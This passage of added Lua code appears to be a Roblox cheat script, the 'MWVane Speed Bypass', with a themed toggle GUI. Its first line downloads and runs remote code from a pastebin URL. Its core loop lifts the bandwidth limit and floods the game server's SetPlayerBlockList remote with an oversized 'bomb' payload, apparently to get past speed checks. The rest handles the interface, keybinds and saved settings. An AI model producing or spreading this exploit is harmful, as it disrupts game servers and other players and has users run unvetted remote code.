+      loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
+		local function parsePower(text)
+			local cleaned = tostring(text or ""):gsub("%s", ""):lower()
+			local n = tonumber(cleaned)
+			if not n then
+				local short = cleaned:match("^(%d+%.?%d*)k$")
+				if short then n = tonumber(short) * 1000 end
+			end
+			return n
+		end
+
+		local function stopSpam()
+			running = false
+			if spamThread then
+				pcall(task.cancel, spamThread)
+				spamThread = nil
+			end
+			bomb = nil
+			pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
+		end
+
+		local function startSpam()
+			if spamThread then pcall(task.cancel, spamThread) end
+			bomb = buildBomb(getCurrentPower())
+			pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+			spamThread = task.spawn(function()
+				while running and not shuttingDown do
+					if bomb then
+						pcall(function()
+							game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+						end)
+					end
+					task.wait(Config.SpamDelay)
+				end
+			end)
+		end
+
+		local function currentTheme()
+			return Themes[Config.Theme] or Themes.IMPULSE
+		end
+
+		local function animate(obj, props, dur, style, dir)
+			local tw = TweenService:Create(
+				obj,
+				TweenInfo.new(dur or 0.2, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out),
+				props
+			)
+			tw:Play()
+			return tw
+		end
+
+		local function updateButtonStyle()
+			local theme = currentTheme()
+			ToggleBtn.Text = running and "ENABLED" or "DISABLED"
+			StatusLabel.Text = running and "BYPASS ENABLED" or "BYPASS DISABLED"
+			HeaderStateText.Text = running and "ACTIVE" or "READY"
+			animate(ToggleBtn, {
+				BackgroundColor3 = running and theme.Soft or Color3.fromRGB(14,13,17),
+				TextColor3 = running and theme.Accent or Color3.fromRGB(151,148,158),
+			}, 0.24)
+			animate(ToggleStroke, {
+				Color = running and theme.Accent or theme.Dark,
+				Transparency = running and 0.05 or 0.42,
+			}, 0.24)
+			animate(StatusDot, { BackgroundColor3 = running and theme.Accent or Color3.fromRGB(87,84,93) }, 0.24)
+			animate(HeaderStateDot, { BackgroundColor3 = running and theme.Accent or Color3.fromRGB(87,84,93) }, 0.24)
+			animate(StatusLabel, { TextColor3 = running and theme.Accent or Color3.fromRGB(190,187,196) }, 0.24)
+			animate(HeaderStateText, { TextColor3 = running and theme.Accent or Color3.fromRGB(160,157,167) }, 0.24)
+		end
+
+		local function applyTheme()
+			local theme = currentTheme()
+			animate(MainStroke, { Color = theme.Dark }, 0.3)
+			animate(HeaderStroke, { Color = theme.Dark }, 0.3)
+			animate(HeaderStateStroke, { Color = theme.Dark }, 0.3)
+			animate(MinimizeStroke, { Color = theme.Dark }, 0.3)
+			animate(StatusStroke, { Color = theme.Dark }, 0.3)
+			animate(TabBarStroke, { Color = theme.Dark }, 0.3)
+			animate(ThemePreviewStroke, { Color = theme.Dark }, 0.3)
+			animate(TopRail, { BackgroundColor3 = theme.Accent }, 0.3)
+			BackGradient.Color = ColorSequence.new({
+				ColorSequenceKeypoint.new(0, theme.Soft),
+				ColorSequenceKeypoint.new(0.32, Color3.fromRGB(7,3,7)),
+				ColorSequenceKeypoint.new(1, Color3.fromRGB(1,1,2)),
+			})
+			for _, s in ipairs({
+				ToggleRowStroke, ModeRowStroke, KeyRowStroke, PadRowStroke, PowerRowStroke,
+				ThemeRowStroke, KeybindStroke, GamepadStroke, InputStroke,
+			}) do
+				animate(s, { Color = theme.Dark }, 0.3)
+			end
+			for _, e in ipairs({
+				ToggleEdge, ModeEdge, KeyEdge, PadEdge, PowerEdge, ThemeEdge,
+			}) do
+				animate(e, { BackgroundColor3 = theme.Accent }, 0.3)
+			end
+			ThemeButton.Text = Config.Theme
+			PreviewName.Text = Config.Theme
+			animate(ThemeButton, { TextColor3 = theme.Accent }, 0.3)
+			animate(ThemeBack, { TextColor3 = theme.Accent }, 0.3)
+			animate(ThemeNext, { TextColor3 = theme.Accent }, 0.3)
+			animate(PreviewRail, { BackgroundColor3 = theme.Accent }, 0.3)
+			animate(PreviewName, { TextColor3 = theme.Accent }, 0.3)
+			animate(PreviewSwatches[1], { BackgroundColor3 = theme.Dark }, 0.3)
+			animate(PreviewSwatches[2], { BackgroundColor3 = theme.Accent }, 0.3)
+			animate(PreviewSwatches[3], { BackgroundColor3 = theme.Soft }, 0.3)
+			MainTab.TextColor3 = activePage == "MAIN" and theme.Accent or Color3.fromRGB(132,129,139)
+			ControlsTab.TextColor3 = activePage == "CONTROLS" and theme.Accent or Color3.fromRGB(132,129,139)
+			VisualTab.TextColor3 = activePage == "VISUAL" and theme.Accent or Color3.fromRGB(132,129,139)
+			MainTab.BackgroundColor3 = activePage == "MAIN" and theme.Soft or Color3.fromRGB(9,8,12)
+			ControlsTab.BackgroundColor3 = activePage == "CONTROLS" and theme.Soft or Color3.fromRGB(9,8,12)
+			VisualTab.BackgroundColor3 = activePage == "VISUAL" and theme.Soft or Color3.fromRGB(9,8,12)
+			local pc = Config.Mode == "PC"
+			PCModeButton.BackgroundColor3 = pc and theme.Soft or Color3.fromRGB(14,13,17)
+			PCModeButton.TextColor3 = pc and theme.Accent or Color3.fromRGB(139,136,146)
+			MobileModeButton.BackgroundColor3 = (not pc) and theme.Soft or Color3.fromRGB(14,13,17)
+			MobileModeButton.TextColor3 = (not pc) and theme.Accent or Color3.fromRGB(139,136,146)
+			updateButtonStyle()
+		end
+
+		local function switchPage(nextName)
+			if nextName == activePage then return end
+			pageToken = pageToken + 1
+			local token = pageToken
+			local order = { MAIN=1, CONTROLS=2, VISUAL=3 }
+			local pages = { MAIN=MainPage, CONTROLS=ControlsPage, VISUAL=VisualPage }
+			if not pages[nextName] then return end
+			local goingRight = order[nextName] > order[activePage]
+			local prev = pages[activePage]
+			local inc  = pages[nextName]
+			activePage = nextName
+			inc.Visible = true
+			inc.Position = UDim2.new(goingRight and 1 or -1, goingRight and 12 or -12, 0, 0)
+			animate(prev, { Position = UDim2.new(goingRight and -1 or 1, goingRight and -12 or 12, 0, 0) }, 0.22)
+			animate(inc, { Position = UDim2.fromOffset(0, 0) }, 0.26)
+			local theme = currentTheme()
+			animate(MainTab, {
+				BackgroundColor3 = activePage=="MAIN" and theme.Soft or Color3.fromRGB(9,8,12),
+				TextColor3 = activePage=="MAIN" and theme.Accent or Color3.fromRGB(132,129,139),
+			}, 0.2)
+			animate(ControlsTab, {
+				BackgroundColor3 = activePage=="CONTROLS" and theme.Soft or Color3.fromRGB(9,8,12),
+				TextColor3 = activePage=="CONTROLS" and theme.Accent or Color3.fromRGB(132,129,139),
+			}, 0.2)
+			animate(VisualTab, {
+				BackgroundColor3 = activePage=="VISUAL" and theme.Soft or Color3.fromRGB(9,8,12),
+				TextColor3 = activePage=="VISUAL" and theme.Accent or Color3.fromRGB(132,129,139),
+			}, 0.2)
+			task.delay(0.23, function()
+				if token == pageToken then
+					prev.Visible = false
+					prev.Position = UDim2.fromOffset(0, 0)
+				end
+			end)
+		end
+
+		local function ToggleBypass()
+			running = not running
+			Config.Enabled = running
+			SaveConfig()
+			if running then startSpam() else stopSpam() end
+			updateButtonStyle()
+		end
+
+		local function updateModeStyle()
+			local theme = currentTheme()
+			local pc = Config.Mode == "PC"
+			animate(PCModeButton, {
+				BackgroundColor3 = pc and theme.Soft or Color3.fromRGB(14,13,17),
+				TextColor3 = pc and theme.Accent or Color3.fromRGB(139,136,146),
+			}, 0.2)
+			animate(MobileModeButton, {
+				BackgroundColor3 = (not pc) and theme.Soft or Color3.fromRGB(14,13,17),
+				TextColor3 = (not pc) and theme.Accent or Color3.fromRGB(139,136,146),
+			}, 0.2)
+			InputBox.Text = formatPower(getCurrentPower())
+			PowerStatus.Text = string.upper(Config.Mode) .. "  /  " .. formatPower(getCurrentPower())
+		end
+
+		local function setMode(mode)
+			if mode ~= "PC" and mode ~= "Mobile" then return end
+			Config.Mode = mode
+			updateModeStyle()
+			SaveConfig()
+			if running then startSpam() end
+		end
+
+		local function UpdatePower(value)
+			local n = parsePower(value)
+			if not n then
+				InputBox.Text = formatPower(getCurrentPower())
+				return
+			end
+			n = math.clamp(math.floor(n + 0.5), 1000, 150000)
+			if Config.Mode == "Mobile" then
+				Config.MobilePower = n
+			else
+				Config.Power = n
+			end
+			InputBox.Text = formatPower(n)
+			PowerStatus.Text = string.upper(Config.Mode) .. "  /  " .. formatPower(n)
+			SaveConfig()
+			if running then startSpam() end
+		end
+
+		local function stepTheme(dir)
+			local i = table.find(ThemeOrder, Config.Theme) or 1
+			i = ((i - 1 + dir) % #ThemeOrder) + 1
+			Config.Theme = ThemeOrder[i]
+			applyTheme()
+			SaveConfig()
+		end
+
+		--==========================================================
+		--  Events
+		--==========================================================
+		ToggleBtn.MouseButton1Click:Connect(ToggleBypass)
+		MainTab.MouseButton1Click:Connect(function() switchPage("MAIN") end)
+		ControlsTab.MouseButton1Click:Connect(function() switchPage("CONTROLS") end)
+		VisualTab.MouseButton1Click:Connect(function() switchPage("VISUAL") end)
+		PCModeButton.MouseButton1Click:Connect(function() setMode("PC") end)
+		MobileModeButton.MouseButton1Click:Connect(function() setMode("Mobile") end)
+		ThemeBack.MouseButton1Click:Connect(function() stepTheme(-1) end)
+		ThemeButton.MouseButton1Click:Connect(function() stepTheme(1) end)
+		ThemeNext.MouseButton1Click:Connect(function() stepTheme(1) end)
+
+		ResetBtn.MouseButton1Click:Connect(function()
+			Config.PositionX = 0
+			Config.PositionY = 0
+			MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+			SaveConfig()
+		end)
+
+		KeybindBtn.MouseButton1Click:Connect(function()
+			listeningForPad = false
+			listeningForKey = true
+			KeybindBtn.Text = "PRESS A KEY"
+			KeybindBtn.TextColor3 = currentTheme().Accent
+		end)
+
+		GamepadBtn.MouseButton1Click:Connect(function()
+			listeningForKey = false
+			listeningForPad = true
+			GamepadBtn.Text = "PRESS BUTTON"
+			GamepadBtn.TextColor3 = currentTheme().Accent
+		end)
+
+		UserInputService.InputBegan:Connect(function(input, processed)
+			if listeningForPad then
+				if (input.UserInputType == Enum.UserInputType.Gamepad1
+					or input.UserInputType == Enum.UserInputType.Gamepad2)
+					and GAMEPAD_BUTTONS[input.KeyCode.Name]
+				then
+					gamepadKeybind = input.KeyCode
+					Config.GamepadKeybind = input.KeyCode.Name
+					GamepadBtn.Text = Config.GamepadKeybind
+					GamepadBtn.TextColor3 = Color3.fromRGB(206,203,212)
+					listeningForPad = false
+					SaveConfig()
+				end
+				return
+			end
+			if listeningForKey and input.UserInputType == Enum.UserInputType.Keyboard then
+				Config.Keybind = input.KeyCode.Name
+				KeybindBtn.Text = Config.Keybind
+				KeybindBtn.TextColor3 = Color3.fromRGB(206,203,212)
+				listeningForKey = false
+				SaveConfig()
+				return
+			end
+			if processed then return end
+			if input.UserInputType == Enum.UserInputType.Keyboard
+				and input.KeyCode.Name == Config.Keybind then
+				playSound(true)
+				ToggleBypass()
+			elseif (input.UserInputType == Enum.UserInputType.Gamepad1
+				or input.UserInputType == Enum.UserInputType.Gamepad2)
+				and input.KeyCode == gamepadKeybind then
+				playSound(true)
+				ToggleBypass()
+			end
+		end)
+
+		InputBox:GetPropertyChangedSignal("Text"):Connect(function()
+			local filtered = InputBox.Text:gsub("[^%d%.kK]", "")
+			if filtered ~= InputBox.Text then
+				InputBox.Text = filtered
+			end
+		end)
+
+		InputBox.FocusLost:Connect(function()
+			UpdatePower(InputBox.Text)
+		end)
+
+		-- Minimize
+		Minimize.MouseButton1Click:Connect(function()
+			minimized = not minimized
+			Config.Minimized = minimized
+			SaveConfig()
+			Minimize.Text = "-"
+			if minimized then
+				animate(MainFrame, { Size = UDim2.fromOffset(WIDTH, 74) }, 0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
+				task.delay(0.14, function()
+					if minimized then
+						StatusStrip.Visible = false
+						TabBar.Visible = false
+						Content.Visible = false
+						Footer.Visible = false
+					end
+				end)
+			else
+				StatusStrip.Visible = true
+				TabBar.Visible = true
+				Content.Visible = true
+				Footer.Visible = true
+				MainFrame.Size = UDim2.fromOffset(WIDTH, 74)
+				animate(MainFrame, { Size = UDim2.fromOffset(WIDTH, 342) }, 0.34, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+			end
+		end)
+
+		-- Drag
+		local dragging = false
+		local dragStart = nil
+		local startPosition = nil
+		Header.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1
+				or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPosition = MainFrame.Position
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+				or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				MainFrame.Position = UDim2.new(
+					startPosition.X.Scale,
+					math.floor(startPosition.X.Offset + delta.X),
+					startPosition.Y.Scale,
+					math.floor(startPosition.Y.Offset + delta.Y)
+				)
+			end
+		end)
+		UserInputService.InputEnded:Connect(function(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1
+				or input.UserInputType == Enum.UserInputType.Touch) then
+				dragging = false
+				Config.PositionX = MainFrame.Position.X.Offset
+				Config.PositionY = MainFrame.Position.Y.Offset
+				SaveConfig()
+			end
+		end)
+
+		-- Hover feedback
+		for _, btn in ipairs({
+			ToggleBtn, PCModeButton, MobileModeButton, KeybindBtn, GamepadBtn,
+			ThemeBack, ThemeButton, ThemeNext, Minimize, MainTab, ControlsTab, VisualTab,
+		}) do
+			btn.MouseButton1Click:Connect(function() playSound(false) end)
+			btn.MouseEnter:Connect(function()
+				animate(btn, { BackgroundTransparency = 0.18 }, 0.14, Enum.EasingStyle.Quad)
+			end)
+			btn.MouseLeave:Connect(function()
+				animate(btn, { BackgroundTransparency = btn == Minimize and 0.08 or 0.02 }, 0.16, Enum.EasingStyle.Quad)
+			end)
+		end
+		for _, row in ipairs({
+			ToggleRow, ModeRow, KeyRow, PadRow, PowerRow, ThemeRow, ThemePreview,
+		}) do
+			row.MouseEnter:Connect(function()
+				animate(row, { BackgroundColor3 = currentTheme().Soft:Lerp(Color3.fromRGB(9,8,12), 0.42) }, 0.18)
+			end)
+			row.MouseLeave:Connect(function()
+				animate(row, { BackgroundColor3 = Color3.fromRGB(9,8,12) }, 0.2)
+			end)
+		end
+
+		--==========================================================
+		--  Stop handler
+		--==========================================================
+		genv.MWVaneSpeedBypassStop = function()
+			shuttingDown = true
+			Config.Minimized = minimized
+			SaveConfig()
+			stopSpam()
+			pcall(function() ClickSound:Destroy() end)
+			pcall(function() KeybindSound:Destroy() end)
+			if ScreenGui then
+				pcall(function() ScreenGui:Destroy() end)
+			end
+		end
+
+		--==========================================================
+		--  Init
+		--==========================================================
+		KeybindBtn.Text = Config.Keybind
+		GamepadBtn.Text = Config.GamepadKeybind
+		applyTheme()
+		updateModeStyle()
+		if running then startSpam() end
+		SaveConfig()
+		if minimized then
+			StatusStrip.Visible = false
+			TabBar.Visible = false
+			Content.Visible = false
+			Footer.Visible = false
+			MainFrame.Size = UDim2.fromOffset(WIDTH, 74)
+		end
+		local settled = UDim2.new(0.5, Config.PositionX, 0.5, Config.PositionY)
+		MainFrame.Position = UDim2.new(0.5, Config.PositionX, 0.5, Config.PositionY + 16)
+		animate(MainFrame, { Position = settled }, 0.48, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+		-- Status dot pulsing
+		task.spawn(function()
+			while not shuttingDown and ScreenGui.Parent do
+				if running then
+					animate(StatusDot, { BackgroundTransparency = 0.58 }, 0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+					animate(HeaderStateDot, { BackgroundTransparency = 0.58 }, 0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+					task.wait(0.7)
+					animate(StatusDot, { BackgroundTransparency = 0 }, 0.75, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+					animate(HeaderStateDot, { BackgroundTransparency = 0 }, 0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+					task.wait(0.7)
+				else
+					StatusDot.BackgroundTransparency = 0
+					HeaderStateDot.BackgroundTransparency = 0
+					task.wait(0.25)
+				end
+			end
+		end)
+	end)
+	if not ok then
+		warn("MWVane Speed Bypass GUI error:", result)
+	end
+end
+
+-- Launch it
+_G.OpenMWVaneSpeedBypass()
